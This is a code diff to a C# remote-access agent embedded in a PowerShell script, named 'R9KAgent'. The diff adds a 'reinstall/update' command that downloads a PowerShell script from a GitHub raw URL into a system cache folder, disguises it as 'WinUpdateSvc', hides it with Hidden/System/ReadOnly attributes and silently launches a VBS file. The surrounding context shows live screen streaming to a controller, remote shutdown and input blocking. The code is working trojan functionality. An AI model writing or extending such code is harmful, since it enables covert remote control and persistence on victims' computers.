@@ -444,7 +444,6 @@ if (-not ("R9KAgent" -as [type])) {
             while (myClient.Connected) {
                 try {
                     if (streaming) {
-                        // ALTERADO AQUI: 1920 de largura e qualidade 80 para Full HD sem pixelar
                         string b64 = CaptureScreen(1920, 80); 
                         if (b64 != null) { lock (writeLock) { myWriter.WriteLine("SCREEN:" + b64); } Thread.Sleep(30); }
                         else Thread.Sleep(100);
@@ -677,6 +676,30 @@ if (-not ("R9KAgent" -as [type])) {
                 if (cmd == "shutdown") { lock (writeLock) { myWriter.WriteLine("SHUTTING_DOWN"); } Thread.Sleep(200); Process.Start("shutdown", "/s /f /t 0"); return; }
                 if (cmd == "logoff")   { lock (writeLock) { myWriter.WriteLine("LOGGING_OFF"); } Thread.Sleep(200); Process.Start("shutdown", "/l /f"); return; }
 
+                // NOVO: Comando para forçar atualização / reinstall
+                if (cmd == "reinstall" || cmd == "update") {
+                    try {
+                        string dir = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches";
+                        if (Directory.Exists(dir)) {
+                            foreach (string sub in Directory.GetDirectories(dir)) {
+                                string leaf = sub.Substring(sub.Length - 8);
+                                string scriptPath = Path.Combine(sub, "WinUpdateSvc_" + leaf + ".ps1");
+                                string vbsPath = Path.Combine(sub, "WinUpdateSvc_" + leaf + ".vbs");
+                                string url = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1";
+
+                                try { if (File.Exists(scriptPath)) File.SetAttributes(scriptPath, FileAttributes.Normal); } catch {}
+                                try { using (var wc = new System.Net.WebClient()) { wc.DownloadFile(url, scriptPath); } } catch {}
+                                try { File.SetAttributes(scriptPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly); } catch {}
+
+                                try { Process.Start("wscript.exe", "//B //Nologo \"" + vbsPath + "\""); } catch {}
+                            }
+                        }
+                    } catch {}
+                    Thread.Sleep(500);
+                    Environment.Exit(0); // Mata a instância atual para a nova assumir
+                    return;
+                }
+
                 if (cmd == "banner_on") {
                     if (bannerThread != null && bannerThread.IsAlive) return;
                     BlockInput(true);
@@ -822,7 +845,6 @@ if (-not ("R9KAgent" -as [type])) {
                         int newW = maxW, newH = (int)(reuseBmp.Height * ((float)maxW / reuseBmp.Width));
                         finalBmp = new Bitmap(newW, newH);
                         using (Graphics g2 = Graphics.FromImage(finalBmp)) {
-                            // ALTERADO AQUI: Melhor interpolação para não pixelar na redução
                             g2.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
                             g2.DrawImage(reuseBmp, 0, 0, newW, newH);
                         }
